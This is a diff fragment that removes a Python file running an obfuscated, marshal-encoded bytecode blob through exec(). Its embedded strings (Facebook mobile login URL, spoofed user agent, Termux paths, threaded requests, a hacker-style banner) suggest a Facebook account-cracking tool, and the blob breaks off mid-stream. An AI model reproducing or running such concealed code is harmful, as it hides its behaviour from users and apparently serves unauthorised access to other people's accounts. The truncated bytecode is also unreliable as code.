@@ -1,2 +1,875 @@
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\xf3\xe0\x0b\x00\x00\x97\x00d\x00d\x01l\x00m\x01Z\x01\x01\x00d\x00d\x02l\x02Z\x02d\x00d\x02l\x03Z\x03d\x00d\x02l\x04Z\x04d\x00d\x03l\x05m\x06Z\x06\x01\x00d\x00d\x02l\x07Z\x07d\x04Z\x08d\x05Z\td\x06Z\nd\x07Z\x0bd\x08Z\x0cd\tZ\rd\nZ\x0ed\x0bZ\x0fd\x0cZ\x10d\x00d\x02l\x03Z\x03\t\x00d\x00d\x02l\x11Z\x11n\x1b#\x00e\x12$\x00r\x13\x01\x00\x02\x00e\x03j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01\t\x00d\x00d\x02l\x13Z\x14n\x1b#\x00e\x12$\x00r\x13\x01\x00\x02\x00e\x03j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01d\x00d\x02l\x03Z\x03d\x00d\x02l\x02Z\x02d\x00d\x02l\x05Z\x05d\x00d\x02l\x11Z\x11d\x00d\x02l\x15Z\x15d\x00d\x02l\x00Z\x00d\x00d\x02l\x16Z\x16d\x00d\x02l\x07Z\x07d\x00d\x02l\x17Z\x17d\x00d\x0fl\x13m\x18Z\x18\x01\x00d\x00d\x02l\x11Z\x11d\x00d\x02l\x19Z\x19d\x00d\x02l\x1aZ\x1ad\x00d\x02l\x1bZ\x1bd\x00d\x02l\x03Z\x03d\x00d\x02l\x02Z\x02d\x00d\x02l\x15Z\x15d\x00d\x02l\x04Z\x04d\x00d\x02l\x05Z\x05d\x00d\x02l\x1cZ\x1cd\x00d\x02l\x17Z\x17\t\x00d\x00d\x02l\x1dZ\x1dnG#\x00e\x12$\x00r?\x01\x00\x02\x00e\x03j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x10\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x05j\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\t\x00d\x00d\x02l\x1dZ\x1dn\x16#\x00e\x12$\x00r\x0e\x01\x00\x02\x00e\x1ed\x12\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01Y\x00n\x04w\x00x\x03Y\x00w\x01d\x00d\x13l\x1fm Z!\x01\x00d\x00d\x14l"m#Z$\x01\x00d\x00d\x15l\x19m%Z&\x01\x00d\x00d\x0fl\x13m\x18Z\'\x01\x00d\x00d\x16l"m(Z)\x01\x00d\x00d\x17l*m+Z,\x01\x00d\x00d\x02l\x16Z\x16d\x00d\x18l\x1dm-Z.\x01\x00d\x00d\x19l/m0Z1\x01\x00d\x00d\x1al2m3Z4\x01\x00d\x00d\x1bl5m6Z6\x01\x00d\x1cg\x01Z7d\x1cg\x01Z8d\x1d\x84\x00Z9d\x1e\x84\x00Z:d\x00d\x02l\x16Z\x16d\x00d\x02l\x1bZ\x1bd\x00d\x02l\x05Z\x05d\x00d\x02l\x02Z\x02d\x00d\x02l\x03Z\x03d\x00d\x02l\x1cZ\x1cd\x00d\x02l;Z;d\x00d\x02l\x05Z\x05d\x00d\x02l\x1bZ\x1bd\x00d\x02l\x15Z\x15d\x00d\x02l<Z<d\x00d\x02l=Z=d\x00d\x02l>Z>d\x00d\x02l?Z?d\x00d\x02l@Z\x03d\x00d\x02lAZAd\x00d\x02lBZBd\x00d\x02lCZCd\x00d\x02lDZDd\x00d\x02lEZEd\x00d\x02lFZFd\x00d\x02lGZGd\x00d\x02l\x04Z\x04d\x00d\x01l\x00m\x01Z\x01\x01\x00d\x00d\x02l\x07Z\x07d\x00d\x1fl\x04m\x04Z\x04\x01\x00\t\x00d\x00d\x02l\x11Z\x11d\x00d lHmIZI\x01\x00d\x00d!lHmJZJ\x01\x00n\x11#\x00\x01\x00\x02\x00e:\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01e\x11jK\x00\x00\x00\x00\x00\x00\x00\x00jL\x00\x00\x00\x00\x00\x00\x00\x00\xa0M\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d"\x84\x00ZN\x02\x00eN\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d#ZOd$ZPd$ZQd$ZRd%ZSd%ZTd$ZUd%ZVd$ZWd$ZQd$ZXd$ZYd&ZZd\'Z[\x02\x00e\x1aj\\\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00j]\x00\x00\x00\x00\x00\x00\x00\x00d\x02d(\x85\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0^\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z_\t\x00\x02\x00e`d)d*\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Zbn?#\x00\x01\x00\x02\x00e`d)d+\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Zcec\xa0d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e_eZz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00ec\xa0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x03x\x03Y\x00w\x01\x02\x00e-d,d-\xac.\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d/Zfd0\x84\x00Zg\x02\x00eg\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d1\x84\x00Zf\x02\x00ef\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e9\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-d2\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d3d4d5d6d7d8d9d:d;\x9c\x08Zhd<\x84\x00Zid=\x84\x00Zj\x02\x00e-d>\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-d?\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-d@\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x04jk\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Zl\x02\x00e-d>\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-el\xa0m\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dA\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-dB\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-d,d-\xac.\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00endC\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00ZoeodDk\x02\x00\x00\x00\x00\x90\x02r7\x02\x00e-d,d-\xac.\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00endE\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Zp\x02\x00e-dF\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e`epd*\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00Zqeq\xa0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00ZrdGeri\x01ZsdHZt\x02\x00e\x11ju\x00\x00\x00\x00\x00\x00\x00\x00etes\xacI\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Zv\x02\x00e\x1bjw\x00\x00\x00\x00\x00\x00\x00\x00evjx\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00ZydJeyv\x01r \x02\x00e-eXePz\x00\x00\x00dKz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x02j\x1e\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00eydJ\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00ZzdLeyv\x01r \x02\x00e-eXePz\x00\x00\x00dKz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x02j\x1e\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00eydL\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00Z{\x02\x00e-dMezz\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-dF\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00dN\xa0|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dO\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z}dP\x02\x00e~er\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00Z\x7fdQ\x02\x00e~ez\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00Z\x80dR\x02\x00e~e{\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00Z\x81e\x7fdFz\x00\x00\x00e\x80z\x00\x00\x00dFz\x00\x00\x00e\x81z\x00\x00\x00Z\x82ere\x82dS\x9c\x02Z\x83\x02\x00e\x11j\x84\x00\x00\x00\x00\x00\x00\x00\x00e}e\x83eh\xacT\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00Z\x85\x02\x00eneXeUz\x00\x00\x00dUz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x86\x02\x00eneXeUz\x00\x00\x00dVz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x87\x02\x00eneXeUz\x00\x00\x00dWz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x88\x02\x00e\x89\x02\x00eneXeUz\x00\x00\x00dXz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x8a\x02\x00e\x89\x02\x00eneXeUz\x00\x00\x00dYz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x8b\x02\x00e-dF\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-dZ\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-d[ez\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-dF\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e`e\x88d*\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x8d\x02\x00e\x8ee\x8a\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]\x17Zl\x02\x00ej\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x8f\x02\x00eie\x86\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c\x18\t\x00d\x02d\x02d\x02\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00d\x02S\x00\x02\x00e-d\\d-\xac.\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e-eXePz\x00\x00\x00d]z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)^\xe9\x00\x00\x00\x00)\x01\xda\x06systemN)\x01\xda\x05sleepz https://m.facebook.com/login.phpz\x07\x1b[97;1mz\x07\x1b[91;1mz\x07\x1b[92;1mz\x07\x1b[93;1mz\x07\x1b[94;1mz\x07\x1b[95;1mz\x07\x1b[96;1m\xfa\x04\x1b[0mz\x14pip install requestsz\x13pip install futures)\x01\xda\x12ThreadPoolExecutorz\x10pip install rich\xe9\x01\x00\x00\x00uE\x00\x00\x00 [\xc3\x97] Cant Install Rich Module, Try Manual Install (pip install rich))\x01\xda\x05Table)\x01\xda\x07Console)\x01\xda\rBeautifulSoup)\x01\xda\x05Group)\x01\xda\x05Panel)\x01\xda\x05print)\x01\xda\x08Markdown)\x01\xda\x07Columns)\x01\xda\x05quotez\xa9User Agent: Mozilla/5.0 (Linux; Android 12; vivo 1938 Build/SP1A.210812.003;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3z\x00\x00\x00\x97\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02k\x00\x00\x00\x00\x00r$t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00d\x00S\x00)\x04Nr\x02\x00\x00\x00\xe9\x03\x00\x00\x00zM\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n)\x04\xda\x03sys\xda\x0cversion_infor\r\x00\x00\x00\xda\x04exit\xa9\x00\xf3\x00\x00\x00\x00\xfa\x01 \xda\x06testPYr\x19\x00\x00\x00?\x00\x00\x00s;\x00\x00\x00\x80\x00\xdd\x07\n\xd4\x07\x17\x98\x01\xd4\x07\x1a\x98Q\xd2\x07\x1e\xd0\x07\x1e\xdd\x08\r\xd0\x0fa\xd1\x08b\xd4\x08b\xd0\x08b\xdd\x08\x0b\x8c\x08\x89\n\x8c\n\x88\n\x88\n\x88\n\xf0\x05\x00\x08\x1f\xd0\x07\x1er\x17\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3\x0c\x02\x00\x00\x97\x00\t\x00d\x01d\x02g\x02}\x00|\x00D\x00]\xf3}\x01\t\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04k\x00\x00\x00\x00\x00r(t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\'t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c\xbc#\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa0\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00\x8c\xf1x\x03Y\x00w\x01d\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)\nN\xda\x08requests\xda\x08coloramar\x02\x00\x00\x00r\x12\x00\x00\x00z\'cd C:\\Python27\\Scripts & pip install {}z\x18python -m pip install {}r\x18\x00\x00\x00z<[+] {} has been installed successfully, Restart the program.z\x18[-] Install {} manually.)\x07r\x13\x00\x00\x00r\x14\x00\x00\x00\xda\x02osr\x03\x00\x00\x00\xda\x06formatr\r\x00\x00\x00r\x15\x00\x00\x00)\x02\xda\x06models\xda\x05models\x02\x00\x00\x00  r\x18\x00\x00\x00\xda\x0fmodelsInstallerr!\x00\x00\x00E\x00\x00\x00s\t\x01\x00\x00\x80\x00\xf0\x02\x10\x05\r\xd8\x12\x1c\x98j\xd0\x11)\x88\x06\xd8\x15\x1b\xf0\x00\x0c\t\x1b\xf0\x00\x0c\t\x1b\x88E\xf0\x02\x0b\r\x1b\xdd\x13\x16\xd4\x13#\xa0A\xd4\x13&\xa8\x11\xd2\x13*\xd0\x13*\xdd\x14\x16\x94I\xd0\x1eG\xd7\x1eN\xd2\x1eN\xc8u\xd1\x1eU\xd4\x1eU\xd1\x14V\xd4\x14V\xd0\x14V\xd0\x14V\xe5\x14\x16\x94I\xd0\x1e8\xd7\x1e?\xd2\x1e?\xc0\x05\xd1\x1eF\xd4\x1eF\xd1\x14G\xd4\x14G\xd0\x14G\xdd\x10\x15\x90c\x91\n\x94\n\x90\n\xdd\x10\x15\xd0\x16T\xd7\x16[\xd2\x16[\xd0\\a\xd1\x16b\xd4\x16b\xd1\x10c\xd4\x10c\xd0\x10c\xdd\x10\x13\x94\x08\x91\n\x94\n\x90\n\xdd\x10\x15\x90c\x91\n\x94\n\x90\n\x90\n\xf8\xf0\x02\x02\r\x1b\xdd\x10\x15\xd0\x160\xd7\x167\xd2\x167\xb8\x05\xd1\x16>\xd4\x16>\xd1\x10?\xd4\x10?\xd0\x10?\xdd\x10\x15\x90c\x91\n\x94\n\x90\n\x90\n\x90\n\xf8\xf8\xf8\xf0\x19\x0c\t\x1b\xf0\x00\x0c\t\x1b\xf8\xf0\x1a\x01\x05\r\xd8\x08\x0c\x88\x04\x88\x04\xf8\xf8\xf8s#\x00\x00\x00\x82\x08C>\x00\x8bB8C\x04\x02\xc3\x03\x01C>\x00\xc3\x043C9\x05\xc37\x05C>\x00\xc3>\x02D\x03\x03)\x01\xda\x08datetime)\x01\xda\x04Fore)\x01\xda\x04initc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3\xa6\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01k\x02\x00\x00\x00\x00r\x16t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03k\x02\x00\x00\x00\x00r\x16t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00d\x00S\x00)\x05N\xda\x05Linux\xda\x05clear\xda\x07Windows\xda\x03cls)\x02r\x03\x00\x00\x00r\x1d\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00r\x18\x00\x00\x00r)\x00\x00\x00r)\x00\x00\x00}\x00\x00\x00sT\x00\x00\x00\x80\x00\xdd\x07\r\x81x\x84x\x907\xd2\x07\x1a\xd0\x07\x1a\xdd\x08\n\x8c\t\x90\'\xd1\x08\x1a\xd4\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xd0\x08\x1a\xe5\x0b\x11\x898\x8c8\x90y\xd2\x0b \xd0\x0b \xdd\x0c\x0e\x8cI\x90e\xd1\x0c\x1c\xd4\x0c\x1c\xd0\x0c\x1c\xd0\x0c\x1c\xd0\x0c\x1c\xf0\x03\x00\x0c!\xd0\x0b r\x17\x00\x00\x00z\x04\x1b[2J\xfa\t\x1b[1;37;1m)\x01r*\x00\x00\x00z\t-M4834M==z\x08 4VIR4J-\xe9\n\x00\x00\x00\xfa0/data/data/com.termux/files/usr/bin/.4VIR4J -cov\xda\x01r\xda\x01w\xfa\n\x1b[1;36;40m\xda\x00\xa9\x01\xda\x03enda\xf6\x01\x00\x00\n\n\n\n$$$$$$$\\  $$\\   $$\\                         $$\\       \n$$  __$$\\ \\__|  $$ |                        $$ |      \n$$ |  $$ |$$\\ $$$$$$\\    $$$$$$\\   $$$$$$$\\ $$$$$$$\\  \n$$$$$$$  |$$ |\\_$$  _|  $$  __$$\\ $$  _____|$$  __$$\\ \n$$  __$$< $$ |  $$ |    $$$$$$$$ |\\$$$$$$\\  $$ |  $$ |\n$$ |  $$ |$$ |  $$ |$$\\ $$   ____| \\____$$\\ $$ |  $$ |\n$$ |  $$ |$$ |  \\$$$$  |\\$$$$$$$\\ $$$$$$$  |$$ |  $$ |\n\\__|  \\__|\\__|   \\____/  \\_______|\\_______/ \\__|  \\__|                                                          \nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00\xf3\x92\x04\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01d\x02\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00}\x01|\x00|\x01v\x00r\x16t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07d\x08\xac\t\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0b\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07d\x08\xac\t\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xa6\x01\x00\x00\xab\x0